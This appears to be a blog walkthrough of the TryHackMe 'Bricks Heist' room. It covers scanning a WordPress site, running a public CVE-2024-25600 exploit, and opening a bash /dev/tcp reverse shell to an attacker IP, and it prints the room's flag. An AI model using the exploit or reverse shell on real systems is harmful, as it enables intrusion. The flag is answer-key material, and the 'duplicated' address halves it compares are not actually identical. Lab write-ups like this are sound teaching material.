---
title: "TryHackMe - Bricks Heist"
date: 2025-02-21 22:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [wordpress, exploitation]

---

---

## Bricks Heist - TryHackMe Walkthrough

### 1. Initial Scanning

I started by scanning the target machine with Nmap:

```bash
nmap -v 10.10.145.97
```

### 2. Identifying the Web Application

Visiting the website, I immediately noticed it was running on WordPress. To gather more details, I attempted a scan with WPScan:

```bash
wpscan --url https://bricks.thm --disable-tls-checks
```

### 3. Finding Exploits

From the scan results, I found that the site was using the "Bricks" theme version 1.9.5. I searched for exploits and found:

- [CVE-2024-25600 Exploit](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
- [Exploit tool](https://github.com/Chocapikk/CVE-2024-25600)

### 4. Exploiting the Vulnerability

I ran the exploit according to the provided instructions. If you encounter issues installing the `alive-progress` package, use:

```bash
pip install alive-progress --break-system-packages
```

Then, I executed:

```bash
python3 bricks.py -u https://bricks.thm
```

### 5. Obtaining a Reverse Shell

To establish a reverse shell, I used Netcat:

```bash
nc -lvnp 4444
```

On the target machine:

```bash
bash -c 'exec bash -i &>/dev/tcp/10.8.21.77/4444 <&1'
```

Upon connection, I retrieved the first flag from:

```
650c844110baced87e1606453b93f22a.txt
```

**Flag:** `THM{fl46_650c844110baced87e1606453b93f22a}`

### 6. Privilege Escalation

I investigated running processes and found the system was running Ubuntu 20.04.6:

```bash
cat /etc/issue
```

Checking active services:

```bash
systemctl list-units --type=service --state=running
```

A suspicious service named `ubuntu.service` was running:

```bash
systemctl cat ubuntu.service
```

The service executed a process called `nm-inet-dialog` from `/lib/NetworkManager`. Upon inspecting the directory, I found a file `inet.conf` containing interesting information—Bitcoin miner logs and an encoded string:

```
5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```

Decoding the string using CyberChef and ChatGPT revealed Bitcoin address:

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

I discovered that this could be a Bitcoin SegWit address used for BTC transactions. However, SegWit addresses are typically between 42-62 characters long, whereas the one I found was 86 characters long, suggesting it might be duplicated. After splitting it in half, I obtained the valid address:
```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```
Researching further, I found that this address was associated with LockBit transactions:

- [BlockChain](https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa)
### Conclusion

This room demonstrated various techniques, from reconnaissance and vulnerability exploitation to privilege escalation and cryptocurrency investigation. It was an interesting challenge that highlighted real-world attack vectors!

